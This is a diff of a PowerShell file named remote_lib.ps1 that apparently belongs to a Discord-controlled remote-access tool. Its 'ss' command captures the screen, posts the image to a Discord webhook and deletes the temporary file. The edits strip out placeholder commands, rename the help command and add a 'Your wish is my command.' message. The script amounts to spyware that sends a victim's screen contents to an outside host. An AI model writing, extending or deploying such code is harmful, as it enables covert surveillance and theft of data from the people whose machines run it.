@@ -34,25 +34,14 @@ function ss {
     $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
     Invoke-DiscordWebhook -WebhookUrl $WebhookUrl -FilePath $tempPath
     Remove-Item $tempPath -ErrorAction SilentlyContinue
-}
-
-# Placeholder command: test
-function test {
-    Write-Host "Test command executed."
-}
-
-# Simple greeting command: hello
-function hello {
-    Write-Host "Hello, world!"
+    Write-Host "Your wish is my command."
 }
 
 # Help command – list available remote‑library commands
-function show-help {
+function help {
     $commands = @{
-        "ss"        = "Capture screenshot and POST to Discord webhook"
-        "test"      = "Placeholder test command"
-        "hello"     = "Print greeting message"
-        "show-help" = "Display this help information"
+        "ss"   = "capture a screenshot and send it to the webhook."
+        "help" = "Display this help information"
     }
     Write-Host "Remote Library Commands:`n"
     foreach ($k in $commands.Keys) {
@@ -61,6 +50,6 @@ function show-help {
 }
 
 # Export the command list to a global variable for easy enumeration (optional)
-$global:RemoteLibCommands = @('ss', 'test', 'hello', 'show-help')
+$global:RemoteLibCommands = @('ss', 'help')
 
 # End of remote_lib.ps1
